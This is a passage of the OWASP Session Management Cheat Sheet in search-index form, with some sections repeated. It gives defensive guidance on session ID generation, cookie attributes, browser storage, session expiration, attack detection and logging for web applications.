cookies (standard HTTP header), URL parameters (URL rewriting \u2013 RFC2396 ), URL arguments on GET requests, body arguments on POST requests, such as hidden form fields (HTML forms), or proprietary HTTP headers. The preferred session ID exchange mechanism should allow defining advanced token properties, such as the token expiration date and time, or granular usage constraints. This is one of the reasons why cookies (RFCs 2109 & 2965 & 6265 ) are one of the most extensively used session ID exchange mechanisms, offering advanced capabilities not available in other methods. The usage of specific session ID exchange mechanisms, such as those where the ID is included in the URL, might disclose the session ID (in web links and logs, web browser history and bookmarks, the Referer header or search engines), as well as facilitate other attacks, such as the manipulation of the ID or session fixation attacks . Built-in Session Management Implementations \u00b6 Web development frameworks, such as J2EE, ASP .NET, PHP, and others, provide their own session management features and associated implementation. It is recommended to use these built-in frameworks versus building a home made one from scratch, as they are used worldwide on multiple web environments and have been tested by the web application security and development communities over time. However, be advised that these frameworks have also presented vulnerabilities and weaknesses in the past, so it is always recommended to use the latest version available, that potentially fixes all the well-known vulnerabilities, as well as review and change the default configuration to enhance its security by following the recommendations described along this document. The storage capabilities or repository used by the session management mechanism to temporarily save the session IDs must be secure, protecting the session IDs against local or remote accidental disclosure or unauthorized access. Used vs. Accepted Session ID Exchange Mechanisms \u00b6 A web application should make use of cookies for session ID exchange management. If a user submits a session ID through a different exchange mechanism, such as a URL parameter, the web application should avoid accepting it as part of a defensive strategy to stop session fixation. NOTE : Even if a web application makes use of cookies as its default session ID exchange mechanism, it might accept other exchange mechanisms too. It is therefore required to confirm via thorough testing all the different mechanisms currently accepted by the web application when processing and managing session IDs, and limit the accepted session ID tracking mechanisms to just cookies. In the past, some web applications used URL parameters, or even switched from cookies to URL parameters (via automatic URL rewriting), if certain conditions are met (for example, the identification of web clients without support for cookies or not accepting cookies due to user privacy concerns). Transport Layer Security \u00b6 In order to protect the session ID exchange from active eavesdropping and passive disclosure in the network traffic, it is essential to use an encrypted HTTPS (TLS) connection for the entire web session, not only for the authentication process where the user credentials are exchanged. Additionally, the Secure cookie attribute must be used to ensure the session ID is only exchanged through an encrypted channel. The usage of an encrypted communication channel also protects the session against some session fixation attacks where the attacker is able to intercept and manipulate the web traffic to inject (or fix) the session ID on the victim's web browser (see here and here ). The following set of best practices are focused on protecting the session ID (specifically when cookies are used) and helping with the integration of HTTPS within the web application: Do not switch a given session from HTTP to HTTPS, or vice-versa, as this will disclose the session ID in the clear through the network. When redirecting to HTTPS, ensure that the cookie is set or regenerated after the redirect has occurred. Do not mix encrypted and unencrypted contents (HTML pages, images, CSS, JavaScript files, etc) in the same page, or from the same domain. Where possible, avoid offering public unencrypted contents and private encrypted contents from the same host. Where insecure content is required, consider hosting this on a separate insecure domain. Implement HTTP Strict Transport Security (HSTS) to enforce HTTPS connections. See the OWASP Transport Layer Protection Cheat Sheet for more general guidance on implementing TLS securely. It is important to emphasize that TLS does not protect against session ID prediction, brute force, client-side tampering or fixation; however, it does provide effective protection against an attacker intercepting or stealing session IDs through a man in the middle attack. Cookies \u00b6 The session ID exchange mechanism based on cookies provides multiple security features in the form of cookie attributes that can be used to protect the exchange of the session ID: Secure Attribute \u00b6 The Secure cookie attribute instructs web browsers to only send the cookie through an encrypted HTTPS (SSL/TLS) connection. This session protection mechanism is mandatory to prevent the disclosure of the session ID through MitM (Man-in-the-Middle) attacks. It ensures that an attacker cannot simply capture the session ID from web browser traffic. Forcing the web application to only use HTTPS for its communication (even when port TCP/80, HTTP, is closed in the web application host) does not protect against session ID disclosure if the Secure cookie has not been set - the web browser can be deceived to disclose the session ID over an unencrypted HTTP connection. The attacker can intercept and manipulate the victim user traffic and inject an HTTP unencrypted reference to the web application that will force the web browser to submit the session ID in the clear. See also: SecureFlag HttpOnly Attribute \u00b6 The HttpOnly cookie attribute instructs web browsers not to allow scripts (e.g. JavaScript or VBscript) an ability to access the cookies via the DOM document.cookie object. This session ID protection is mandatory to prevent session ID stealing through XSS attacks. However, if an XSS attack is combined with a CSRF attack, the requests sent to the web application will include the session cookie, as the browser always includes the cookies when sending requests. The HttpOnly cookie only protects the confidentiality of the cookie; the attacker cannot use it offline, outside of the context of an XSS attack. See the OWASP XSS (Cross Site Scripting) Prevention Cheat Sheet . See also: HttpOnly SameSite Attribute \u00b6 SameSite allows a server define a cookie attribute making it impossible to the browser send this cookie along with cross-site requests. The main goal is to mitigate the risk of cross-origin information leakage, and provides some protection against cross-site request forgery attacks. See also: SameSite Domain and Path Attributes \u00b6 The Domain cookie attribute instructs web browsers to only send the cookie to the specified domain and all subdomains. If the attribute is not set, by default the cookie will only be sent to the origin server. The Path cookie attribute instructs web browsers to only send the cookie to the specified directory or subdirectories (or paths or resources) within the web application. If the attribute is not set, by default the cookie will only be sent for the directory (or path) of the resource requested and setting the cookie. It is recommended to use a narrow or restricted scope for these two attributes. In this way, the Domain attribute should not be set (restricting the cookie just to the origin server) and the Path attribute should be set as restrictive as possible to the web application path that makes use of the session ID. Setting the Domain attribute to a too permissive value, such as example.com allows an attacker to launch attacks on the session IDs between different hosts and web applications belonging to the same domain, known as cross-subdomain cookies. For example, vulnerabilities in www.example.com might allow an attacker to get access to the session IDs from secure.example.com . Additionally, it is recommended not to mix web applications of different security levels on the same domain. Vulnerabilities in one of the web applications would allow an attacker to set the session ID for a different web application on the same domain by using a permissive Domain attribute (such as example.com ) which is a technique that can be used in session fixation attacks . Although the Path attribute allows the isolation of session IDs between different web applications using different paths on the same host, it is highly recommended not to run different web applications (especially from different security levels or scopes) on the same host. Other methods can be used by these applications to access the session IDs, such as the document.cookie object. Also, any web application can set cookies for any path on that host. Cookies are vulnerable to DNS spoofing/hijacking/poisoning attacks, where an attacker can manipulate the DNS resolution to force the web browser to disclose the session ID for a given host or domain. Expire and Max-Age Attributes \u00b6 Session management mechanisms based on cookies can make use of two types of cookies, non-persistent (or session) cookies, and persistent cookies. If a cookie presents the Max-Age (that has preference over Expires ) or Expires attributes, it will be considered a persistent cookie and will be stored on disk by the web browser based until the expiration time. Typically, session management capabilities to track users after authentication make use of non-persistent cookies. This forces the session to disappear from the client if the current web browser instance is closed. Therefore, it is highly recommended to use non-persistent cookies for session management purposes, so that the session ID does not remain on the web client cache for long periods of time, from where an attacker can obtain it. Ensure that sensitive information is not comprised, by ensuring that sensitive information is not persistent / encrypting / stored on a need basis for the duration of the need Ensure that unauthorized activities cannot take place via cookie manipulation Ensure secure flag is set to prevent accidental transmission over \"the wire\" in a non-secure manner Determine if all state transitions in the application code properly check for the cookies and enforce their use Ensure entire cookie should be encrypted if sensitive data is persisted in the cookie Define all cookies being used by the application, their name and why they are needed HTML5 Web Storage API \u00b6 The Web Hypertext Application Technology Working Group (WHATWG) describes the HTML5 Web Storage APIs, localStorage and sessionStorage , as mechanisms for storing name-value pairs client-side. Unlike HTTP cookies, the contents of localStorage and sessionStorage are not automatically shared within requests or responses by the browser and are used for storing data client-side. The localStorage API \u00b6 Scope \u00b6 Data stored using the localStorage API is accessible by pages which are loaded from the same origin, which is defined as the scheme ( https:// ), host ( example.com ), port ( 443 ) and domain/realm ( example.com ). This provides similar access to this data as would be achieved by using the secure flag on a cookie, meaning that data stored from https could not be retrieved via http . Due to potential concurrent access from separate windows/threads, data stored using localStorage may be susceptible to shared access issues (such as race-conditions) and should be considered non-locking ( Web Storage API Spec ). Duration \u00b6 Data stored using the localStorage API is persisted across browsing sessions, extending the timeframe in which it may be accessible to other system users. Offline Access \u00b6 The standards do not require localStorage data to be encrypted-at-rest, meaning it may be possible to directly access this data from disk. Use Case \u00b6 WHATWG suggests the use of localStorage for data that needs to be accessed across windows or tabs, across multiple sessions, and where large (multi-megabyte) volumes of data may need to be stored for performance reasons. The sessionStorage API \u00b6 Scope \u00b6 The sessionStorage API stores data within the window context from which it was called, meaning that Tab 1 cannot access data which was stored from Tab 2. Also, like the localStorage API, data stored using the sessionStorage API is accessible by pages which are loaded from the same origin, which is defined as the scheme ( https:// ), host ( example.com ), port ( 443 ) and domain/realm ( example.com ). This provides similar access to this data as would be achieved by using the secure flag on a cookie, meaning that data stored from https could not be retrieved via http . Duration \u00b6 The sessionStorage API only stores data for the duration of the current browsing session. Once the tab is closed, that data is no longer retrievable. This does not necessarily prevent access, should a browser tab be reused or left open. Data may also persist in memory until a garbage collection event. Offline Access \u00b6 The standards do not require sessionStorage data to be encrypted-at-rest, meaning it may be possible to directly access this data from disk. Use Case \u00b6 WHATWG suggests the use of sessionStorage for data that is relevant for one-instance of a workflow, such as details for a ticket booking, but where multiple workflows could be performed in other tabs concurrently. The window/tab bound nature will keep the data from leaking between workflows in separate tabs. Security Risks \u00b6 In general, secure or sensitive data should not be stored persistently in browser data stores as this may permit information leakage on shared systems. Because the Web Storage mechanisms are APIs, this also permits access from injected scripts, making it less secure than cookies with the httponly flag applied. While a case could be made for storing workflow specific data in sessionStorage for use by that specific tab/window across reloads, the Web Storage APIs should be treated as insecure storage. Because of this, if a business solution requires the use of the localStorage or sessionStorage to store sensitive data, such a solution should encipher data and apply replay protections. Due to the potential to access Web Storage APIs via an XSS attack, session identifiers should be stored using non-persistent cookies, with the appropriate flags to protect from insecure access ( Secure ), XSS ( HttpOnly ) and CSRF issues ( SameSite ). References \u00b6 Web Storage APIs LocalStorage API SessionStorage API WHATWG Web Storage Spec Web Workers \u00b6 Web Workers run JavaScript code in a global context separate from the one of the current window. A communication channel with the main execution window exists, which is called MessageChannel . Use Case \u00b6 Web Workers are an alternative for browser storage of (session) secrets when storage persistence across page refresh is not a requirement. For Web Workers to provide secure browser storage, any code that requires the secret should exist within the Web Worker and the secret should never be transmitted to the main window context. Storing secrets within the memory of a Web Worker offers the same security guarantees as an HttpOnly cookie: the confidentiality of the secret is protected. Still, an XSS attack can be used to send messages to the Web Worker to perform an operation that requires the secret. The Web Worker will return the result of the operation to the main execution thread. The advantage of a Web Worker implementation compared to an HttpOnly cookie is that a Web Worker allows for some isolated JavaScript code to access the secret; an HttpOnly cookie is not accessible to any JavaScript. If the frontend JavaScript code requires access to the secret, the Web Worker implementation is the only browser storage option that preserves the secret confidentiality. Session ID Life Cycle \u00b6 Session ID Generation and Verification: Permissive and Strict Session Management \u00b6 There are two types of session management mechanisms for web applications, permissive and strict, related to session fixation vulnerabilities. The permissive mechanism allows the web application to initially accept any session ID value set by the user as valid, creating a new session for it, while the strict mechanism enforces that the web application will only accept session ID values that have been previously generated by the web application. The session tokens should be handled by the web server if possible or generated via a cryptographically secure random number generator. Although the most common mechanism in use today is the strict one (more secure, PHP defaults to permissive ). Developers must ensure that the web application does not use a permissive mechanism under certain circumstances. Web applications should never accept a session ID they have never generated, and in case of receiving one, they should generate and offer the user a new valid session ID. Additionally, this scenario should be detected as a suspicious activity and an alert should be generated. Manage Session ID as Any Other User Input \u00b6 Session IDs must be considered untrusted, as any other user input processed by the web application, and they must be thoroughly validated and verified. Depending on the session management mechanism used, the session ID will be received in a GET or POST parameter, in the URL or in an HTTP header (e.g. cookies). If web applications do not validate and filter out invalid session ID values before processing them, they can potentially be used to exploit other web vulnerabilities, such as SQL injection if the session IDs are stored on a relational database, or persistent XSS if the session IDs are stored and reflected back afterwards by the web application. Renew the Session ID After Any Privilege Level Change \u00b6 The session ID must be renewed or regenerated by the web application after any privilege level change within the associated user session. The most common scenario where the session ID regeneration is mandatory is during the authentication process, as the privilege level of the user changes from the unauthenticated (or anonymous) state to the authenticated state. Other common scenarios must also be considered, such as password changes, permission changes or switching from a regular user role to an administrator role within the web application. For all these web application critical pages, previous session IDs have to be ignored, a new session ID must be assigned to every new request received for the critical resource, and the old or previous session ID must be destroyed. The most common web development frameworks provide session functions and methods to renew the session ID, such as request.getSession(true) & HttpSession.invalidate() (J2EE), Session.Abandon() & Response.Cookies.Add(new...) (ASP .NET), or session_start() & session_regenerate_id(true) (PHP). The session ID regeneration is mandatory to prevent session fixation attacks , where an attacker sets the session ID on the victims user web browser instead of gathering the victims session ID, as in most of the other session-based attacks, and independently of using HTTP or HTTPS. This protection mitigates the impact of other web-based vulnerabilities that can also be used to launch session fixation attacks, such as HTTP response splitting or XSS (see here and here ). A complementary recommendation is to use a different session ID or token name (or set of session IDs) pre and post authentication, so that the web application can keep track of anonymous users and authenticated users without the risk of exposing or binding the user session between both states. Considerations When Using Multiple Cookies \u00b6 If the web application uses cookies as the session ID exchange mechanism, and multiple cookies are set for a given session, the web application must verify all cookies (and enforce relationships between them) before allowing access to the user session. It is very common for web applications to set a user cookie pre-authentication over HTTP to keep track of unauthenticated (or anonymous) users. Once the user authenticates in the web application, a new post-authentication secure cookie is set over HTTPS, and a binding between both cookies and the user session is established. If the web application does not verify both cookies for authenticated sessions, an attacker can make use of the pre-authentication unprotected cookie to get access to the authenticated user session (see here and here ). Web applications should try to avoid the same cookie name for different paths or domain scopes within the same web application, as this increases the complexity of the solution and potentially introduces scoping issues. Session Expiration \u00b6 In order to minimize the time period an attacker can launch attacks over active sessions and hijack them, it is mandatory to set expiration timeouts for every session, establishing the amount of time a session will remain active. Insufficient session expiration by the web application increases the exposure of other session-based attacks, as for the attacker to be able to reuse a valid session ID and hijack the associated session, it must still be active. The shorter the session interval is, the lesser the time an attacker has to use the valid session ID. The session expiration timeout values must be set accordingly with the purpose and nature of the web application, and balance security and usability, so that the user can comfortably complete the operations within the web application without his session frequently expiring. Both the idle and absolute timeout values are highly dependent on how critical the web application and its data are. Common idle timeouts ranges are 2-5 minutes for high-value applications and 15-30 minutes for low risk applications. Absolute timeouts depend on how long a user usually uses the application. If the application is intended to be used by an office worker for a full day, an appropriate absolute timeout range could be between 4 and 8 hours. When a session expires, the web application must take active actions to invalidate the session on both sides, client and server. The latter is the most relevant and mandatory from a security perspective. For most session exchange mechanisms, client side actions to invalidate the session ID are based on clearing out the token value. For example, to invalidate a cookie it is recommended to provide an empty (or invalid) value for the session ID, and set the Expires (or Max-Age ) attribute to a date from the past (in case a persistent cookie is being used): Set-Cookie: id=; Expires=Friday, 17-May-03 18:45:00 GMT In order to close and invalidate the session on the server side, it is mandatory for the web application to take active actions when the session expires, or the user actively logs out, by using the functions and methods offered by the session management mechanisms, such as HttpSession.invalidate() (J2EE), Session.Abandon() (ASP .NET) or session_destroy()/unset() (PHP). Automatic Session Expiration \u00b6 Idle Timeout \u00b6 All sessions should implement an idle or inactivity timeout. This timeout defines the amount of time a session will remain active in case there is no activity in the session, closing and invalidating the session upon the defined idle period since the last HTTP request received by the web application for a given session ID. The idle timeout limits the chances an attacker has to guess and use a valid session ID from another user. However, if the attacker is able to hijack a given session, the idle timeout does not limit the attacker's actions, as he can generate activity on the session periodically to keep the session active for longer periods of time. Session timeout management and expiration must be enforced server-side. If the client is used to enforce the session timeout, for example using the session token or other client parameters to track time references (e.g. number of minutes since login time), an attacker could manipulate these to extend the session duration. Absolute Timeout \u00b6 All sessions should implement an absolute timeout, regardless of session activity. This timeout defines the maximum amount of time a session can be active, closing and invalidating the session upon the defined absolute period since the given session was initially created by the web application. After invalidating the session, the user is forced to (re)authenticate again in the web application and establish a new session. The absolute session limits the amount of time an attacker can use a hijacked session and impersonate the victim user. Renewal Timeout \u00b6 Alternatively, the web application can implement an additional renewal timeout after which the session ID is automatically renewed, in the middle of the user session, and independently of the session activity and, therefore, of the idle timeout. After a specific amount of time since the session was initially created, the web application can regenerate a new ID for the user session and try to set it, or renew it, on the client. The previous session ID value would still be valid for some time, accommodating a safety interval, before the client is aware of the new ID and starts using it. At that time, when the client switches to the new ID inside the current session, the application invalidates the previous ID. This scenario minimizes the amount of time a given session ID value, potentially obtained by an attacker, can be reused to hijack the user session, even when the victim user session is still active. The user session remains alive and open on the legitimate client, although its associated session ID value is transparently renewed periodically during the session duration, every time the renewal timeout expires. Therefore, the renewal timeout complements the idle and absolute timeouts, specially when the absolute timeout value extends significantly over time (e.g. it is an application requirement to keep the user sessions open for long periods of time). Depending on the implementation, potentially there could be a race condition where the attacker with a still valid previous session ID sends a request before the victim user, right after the renewal timeout has just expired, and obtains first the value for the renewed session ID. At least in this scenario, the victim user might be aware of the attack as her session will be suddenly terminated because her associated session ID is not valid anymore. Manual Session Expiration \u00b6 Web applications should provide mechanisms that allow security aware users to actively close their session once they have finished using the web application. Logout Button \u00b6 Web applications must provide a visible and easily accessible logout (logoff, exit, or close session) button that is available on the web application header or menu and reachable from every web application resource and page, so that the user can manually close the session at any time. As described in Session_Expiration section, the web application must invalidate the session at least on server side. NOTE : Unfortunately, not all web applications facilitate users to close their current session. Thus, client-side enhancements allow conscientious users to protect their sessions by helping to close them diligently. Web Content Caching \u00b6 Even after the session has been closed, it might be possible to access the private or sensitive data exchanged within the session through the web browser cache. Therefore, web applications must use restrictive cache directives for all the web traffic exchanged through HTTP and HTTPS, such as the Cache-Control and Pragma HTTP headers, and/or equivalent META tags on all or (at least) sensitive web pages. Independently of the cache policy defined by the web application, if caching web application contents is allowed, the session IDs must never be cached, so it is highly recommended to use the Cache-Control: no-cache=\"Set-Cookie, Set-Cookie2\" directive, to allow web clients to cache everything except the session ID (see here ). Additional Client-Side Defenses for Session Management \u00b6 Web applications can complement the previously described session management defenses with additional countermeasures on the client side. Client-side protections, typically in the form of JavaScript checks and verifications, are not bullet proof and can easily be defeated by a skilled attacker, but can introduce another layer of defense that has to be bypassed by intruders. Initial Login Timeout \u00b6 Web applications can use JavaScript code in the login page to evaluate and measure the amount of time since the page was loaded and a session ID was granted. If a login attempt is tried after a specific amount of time, the client code can notify the user that the maximum amount of time to log in has passed and reload the login page, hence retrieving a new session ID. This extra protection mechanism tries to force the renewal of the session ID pre-authentication, avoiding scenarios where a previously used (or manually set) session ID is reused by the next victim using the same computer, for example, in session fixation attacks. Force Session Logout On Web Browser Window Close Events \u00b6 Web applications can use JavaScript code to capture all the web browser tab or window close (or even back) events and take the appropriate actions to close the current session before closing the web browser, emulating that the user has manually closed the session via the logout button. Disable Web Browser Cross-Tab Sessions \u00b6 Web applications can use JavaScript code once the user has logged in and a session has been established to force the user to re-authenticate if a new web browser tab or window is opened against the same web application. The web application does not want to allow multiple web browser tabs or windows to share the same session. Therefore, the application tries to force the web browser to not share the same session ID simultaneously between them. NOTE : This mechanism cannot be implemented if the session ID is exchanged through cookies, as cookies are shared by all web browser tabs/windows. Automatic Client Logout \u00b6 JavaScript code can be used by the web application in all (or critical) pages to automatically logout client sessions after the idle timeout expires, for example, by redirecting the user to the logout page (the same resource used by the logout button mentioned previously). The benefit of enhancing the server-side idle timeout functionality with client-side code is that the user can see that the session has finished due to inactivity, or even can be notified in advance that the session is about to expire through a count down timer and warning messages. This user-friendly approach helps to avoid loss of work in web pages that require extensive input data due to server-side silently expired sessions. Session Attacks Detection \u00b6 Session ID Guessing and Brute Force Detection \u00b6 If an attacker tries to guess or brute force a valid session ID, he needs to launch multiple sequential requests against the target web application using different session IDs from a single (or set of) IP address(es). Additionally, if an attacker tries to analyze the predictability of the session ID (e.g. using statistical analysis), he needs to launch multiple sequential requests from a single (or set of) IP address(es) against the target web application to gather new valid session IDs. Web applications must be able to detect both scenarios based on the number of attempts to gather (or use) different session IDs and alert and/or block the offending IP address(es). Detecting Session ID Anomalies \u00b6 Web applications should focus on detecting anomalies associated to the session ID, such as its manipulation. The OWASP AppSensor Project provides a framework and methodology to implement built-in intrusion detection capabilities within web applications focused on the detection of anomalies and unexpected behaviors, in the form of detection points and response actions. Instead of using external protection layers, sometimes the business logic details and advanced intelligence are only available from inside the web application, where it is possible to establish multiple session related detection points, such as when an existing cookie is modified or deleted, a new cookie is added, the session ID from another user is reused, or when the user location or User-Agent changes in the middle of a session. Binding the Session ID to Other User Properties \u00b6 With the goal of detecting (and, in some scenarios, protecting against) user misbehaviors and session hijacking, it is highly recommended to bind the session ID to other user or client properties, such as the client IP address, User-Agent, or client-based digital certificate. If the web application detects any change or anomaly between these different properties in the middle of an established session, this is a very good indicator of session manipulation and hijacking attempts, and this simple fact can be used to alert and/or terminate the suspicious session. Although these properties cannot be used by web applications to trustingly defend against session attacks, they significantly increase the web application detection (and protection) capabilities. However, a skilled attacker can bypass these controls by reusing the same IP address assigned to the victim user by sharing the same network (very common in NAT environments, like Wi-Fi hotspots) or by using the same outbound web proxy (very common in corporate environments), or by manually modifying his User-Agent to look exactly as the victim users does. Logging Sessions Life Cycle: Monitoring Creation, Usage, and Destruction of Session IDs \u00b6 Web applications should increase their logging capabilities by including information regarding the full life cycle of sessions. In particular, it is recommended to record session related events, such as the creation, renewal, and destruction of session IDs, as well as details about its usage within login and logout operations, privilege level changes within the session, timeout expiration, invalid session activities (when detected), and critical business operations during the session. The log details might include a timestamp, source IP address, web target resource requested (and involved in a session operation), HTTP headers (including the User-Agent and Referer), GET and POST parameters, error codes and messages, username (or user ID), plus the session ID (cookies, URL, GET, POST\u2026). Sensitive data like the session ID should not be included in the logs in order to protect the session logs against session ID local or remote disclosure or unauthorized access. However, some kind of session-specific information must be logged in order to correlate log entries to specific sessions. It is recommended to log a salted-hash of the session ID instead of the session ID itself in order to allow for session-specific log correlation without exposing the session ID. In particular, web applications must thoroughly protect administrative interfaces that allow to manage all the current active sessions. Frequently these are used by support personnel to solve session related issues, or even general issues, by impersonating the user and looking at the web application as the user does. The session logs become one of the main web application intrusion detection data sources, and can also be used by intrusion protection systems to automatically terminate sessions and/or disable user accounts when (one or many) attacks are detected. If active protections are implemented, these defensive actions must be logged too. Simultaneous Session Logons \u00b6 It is the web application design decision to determine if multiple simultaneous logons from the same user are allowed from the same or from different client IP addresses. If the web application does not want to allow simultaneous session logons, it must take effective actions after each new authentication event, implicitly terminating the previously available session, or asking the user (through the old, new or both sessions) about the session that must remain active. It is recommended for web applications to add user capabilities that allow checking the details of active sessions at any time, monitor and alert the user about concurrent logons, provide user features to remotely terminate sessions manually, and track account activity history (logbook) by recording multiple client details such as IP address, User-Agent, login date and time, idle time, etc. Session Management WAF Protections \u00b6 There are situations where the web application source code is not available or cannot be modified, or when the changes required to implement the multiple security recommendations and best practices detailed above imply a full redesign of the web application architecture, and therefore, cannot be easily implemented in the short term. In these scenarios, or to complement the web application defenses, and with the goal of keeping the web application as secure as possible, it is recommended to use external protections such as Web Application Firewalls (WAFs) that can mitigate the session management threats already described. Web Application Firewalls offer detection and protection capabilities against session based attacks. On the one hand, it is trivial for WAFs to enforce the usage of security attributes on cookies, such as the Secure and HttpOnly flags, applying basic rewriting rules on the Set-Cookie header for all the web application responses that set a new cookie. On the other hand, more advanced capabilities can be implemented to allow the WAF to keep track of sessions, and the corresponding session IDs, and apply all kind of protections against session fixation (by renewing the session ID on the client-side when privilege changes are detected), enforcing sticky sessions (by verifying the relationship between the session ID and other client properties, like the IP address or User-Agent), or managing session expiration (by forcing both the client and the web application to finalize the session). The open-source ModSecurity WAF, plus the OWASP Core Rule Set , provide capabilities to detect and apply security cookie attributes, countermeasures against session fixation attacks, and session tracking features to enforce sticky sessions.","title":"Session Management"},{"location":"cheatsheets/Session_Management_Cheat_Sheet.html#session-management-cheat-sheet","text":"","title":"Session Management Cheat Sheet"},{"location":"cheatsheets/Session_Management_Cheat_Sheet.html#introduction","text":"Web Authentication, Session Management, and Access Control : A web session is a sequence of network HTTP request and response transactions associated with the same user. Modern and complex web applications require the retaining of information or status about each user for the duration of multiple requests. Therefore, sessions provide the ability to establish variables \u2013 such as access rights and localization settings \u2013 which will apply to each and every interaction a user has with the web application for the duration of the session. Web applications can create sessions to keep track of anonymous users after the very first user request. An example would be maintaining the user language preference. Additionally, web applications will make use of sessions once the user has authenticated. This ensures the ability to identify the user on any subsequent requests as well as being able to apply security access controls, authorized access to the user private data, and to increase the usability of the application. Therefore, current web applications can provide session capabilities both pre and post authentication. Once an authenticated session has been established, the session ID (or token) is temporarily equivalent to the strongest authentication method used by the application, such as username and password, passphrases, one-time passwords (OTP), client-based digital certificates, smartcards, or biometrics (such as fingerprint or eye retina). See the OWASP Authentication Cheat Sheet . HTTP is a stateless protocol ( RFC2616 section 5), where each request and response pair is independent of other web interactions. Therefore, in order to introduce the concept of a session, it is required to implement session management capabilities that link both the authentication and access control (or authorization) modules commonly available in web applications: The session ID or token binds the user authentication credentials (in the form of a user session) to the user HTTP traffic and the appropriate access controls enforced by the web application. The complexity of these three components (authentication, session management, and access control) in modern web applications, plus the fact that its implementation and binding resides on the web developer's hands (as web development frameworks do not provide strict relationships between these modules), makes the implementation of a secure session management module very challenging. The disclosure, capture, prediction, brute force, or fixation of the session ID will lead to session hijacking (or sidejacking) attacks, where an attacker is able to fully impersonate a victim user in the web application. Attackers can perform two types of session hijacking attacks, targeted or generic. In a targeted attack, the attacker's goal is to impersonate a specific (or privileged) web application victim user. For generic attacks, the attacker's goal is to impersonate (or get access as) any valid or legitimate user in the web application.","title":"Introduction"},{"location":"cheatsheets/Session_Management_Cheat_Sheet.html#session-id-properties","text":"In order to keep the authenticated state and track the users progress within the web application, applications provide users with a session identifier (session ID or token) that is assigned at session creation time, and is shared and exchanged by the user and the web application for the duration of the session (it is sent on every HTTP request). The session ID is a name=value pair. With the goal of implementing secure session IDs, the generation of identifiers (IDs or tokens) must meet the following properties.","title":"Session ID Properties"},{"location":"cheatsheets/Session_Management_Cheat_Sheet.html#session-id-name-fingerprinting","text":"The name used by the session ID should not be extremely descriptive nor offer unnecessary details about the purpose and meaning of the ID. The session ID names used by the most common web application development frameworks can be easily fingerprinted , such as PHPSESSID (PHP), JSESSIONID (J2EE), CFID & CFTOKEN (ColdFusion), ASP.NET_SessionId (ASP .NET), etc. Therefore, the session ID name can disclose the technologies and programming languages used by the web application. It is recommended to change the default session ID name of the web development framework to a generic name, such as id .","title":"Session ID Name Fingerprinting"},{"location":"cheatsheets/Session_Management_Cheat_Sheet.html#session-id-length","text":"The session ID must be long enough to prevent brute force attacks, where an attacker can go through the whole range of ID values and verify the existence of valid sessions. The session ID length must be at least 128 bits (16 bytes) . NOTE : The session ID length of 128 bits is provided as a reference based on the assumptions made on the next section Session ID Entropy . However, this number should not be considered as an absolute minimum value, as other implementation factors might influence its strength. For example, there are well-known implementations, such as Microsoft ASP.NET session IDs : \" The ASP .NET session identifier is a randomly generated number encoded into a 24-character string consisting of lowercase characters from a to z and numbers from 0 to 5 \". It can provide a very good effective entropy, and as a result, can be considered long enough to avoid guessing or brute force attacks.","title":"Session ID Length"},{"location":"cheatsheets/Session_Management_Cheat_Sheet.html#session-id-entropy","text":"The session ID must be unpredictable (random enough) to prevent guessing attacks, where an attacker is able to guess or predict the ID of a valid session through statistical analysis techniques. For this purpose, a good CSPRNG (Cryptographically Secure Pseudorandom Number Generator) must be used. The session ID value must provide at least 64 bits of entropy (if a good PRNG is used, this value is estimated to be half the length of the session ID). Additionally, a random session ID is not enough; it must also be unique to avoid duplicated IDs. A random session ID must not already exist in the current session ID space. NOTE : The session ID entropy is really affected by other external and difficult to measure factors, such as the number of concurrent active sessions the web application commonly has, the absolute session expiration timeout, the amount of session ID guesses per second the attacker can make and the target web application can support, etc. If a session ID with an entropy of 64 bits is used, it will take an attacker at least 292 years to successfully guess a valid session ID, assuming the attacker can try 10,000 guesses per second with 100,000 valid simultaneous sessions available in the web application. More information here .","title":"Session ID Entropy"},{"location":"cheatsheets/Session_Management_Cheat_Sheet.html#session-id-content-or-value","text":"The session ID content (or value) must be meaningless to prevent information disclosure attacks, where an attacker is able to decode the contents of the ID and extract details of the user, the session, or the inner workings of the web application. The session ID must simply be an identifier on the client side, and its value must never include sensitive information (or PII ). The meaning and business or application logic associated with the session ID must be stored on the server side, and specifically, in session objects or in a session management database or repository. The stored information can include the client IP address, User-Agent, e-mail, username, user ID, role, privilege level, access rights, language preferences, account ID, current state, last login, session timeouts, and other internal session details. If the session objects and properties contain sensitive information, such as credit card numbers, it is required to duly encrypt and protect the session management repository. It is recommended to create cryptographically strong session IDs through the usage of cryptographic hash functions such as SHA256.","title":"Session ID Content (or Value)"},{"location":"cheatsheets/Session_Management_Cheat_Sheet.html#session-management-implementation","text":"The session management implementation defines the exchange mechanism that will be used between the user and the web application to share and continuously exchange the session ID. There are multiple mechanisms available in HTTP to maintain session state within web applications, such as cookies (standard HTTP header), URL parameters (URL rewriting \u2013 RFC2396 ), URL arguments on GET requests, body arguments on POST requests, such as hidden form fields (HTML forms), or proprietary HTTP headers. The preferred session ID exchange mechanism should allow defining advanced token properties, such as the token expiration date and time, or granular usage constraints. This is one of the reasons why cookies (RFCs 2109 & 2965 & 6265 ) are one of the most extensively used session ID exchange mechanisms, offering advanced capabilities not available in other methods. The usage of specific session ID exchange mechanisms, such as those where the ID is included in the URL, might disclose the session ID (in web links and logs, web browser history and bookmarks, the Referer header or search engines), as well as facilitate other attacks, such as the manipulation of the ID or session fixation attacks .","title":"Session Management Implementation"},{"location":"cheatsheets/Session_Management_Cheat_Sheet.html#built-in-session-management-implementations","text":"Web development frameworks, such as J2EE, ASP .NET, PHP, and others, provide their own session management features and associated implementation. It is recommended to use these built-in frameworks versus building a home made one from scratch, as they are used worldwide on multiple web environments and have been tested by the web application security and development communities over time. However, be advised that these frameworks have also presented vulnerabilities and weaknesses in the past, so it is always recommended to use the latest version available, that potentially fixes all the well-known vulnerabilities, as well as review and change the default configuration to enhance its security by following the recommendations described along this document. The storage capabilities or repository used by the session management mechanism to temporarily save the session IDs must be secure, protecting the session IDs against local or remote accidental disclosure or unauthorized access.","title":"Built-in Session Management Implementations"},{"location":"cheatsheets/Session_Management_Cheat_Sheet.html#used-vs-accepted-session-id-exchange-mechanisms","text":"A web application should make use of cookies for session ID exchange management. If a user submits a session ID through a different exchange mechanism, such as a URL parameter, the web application should avoid accepting it as part of a defensive strategy to stop session fixation. NOTE : Even if a web application makes use of cookies as its default session ID exchange mechanism, it might accept other exchange mechanisms too. It is therefore required to confirm via thorough testing all the different mechanisms currently accepted by the web application when processing and managing session IDs, and limit the accepted session ID tracking mechanisms to just cookies. In the past, some web applications used URL parameters, or even switched from cookies to URL 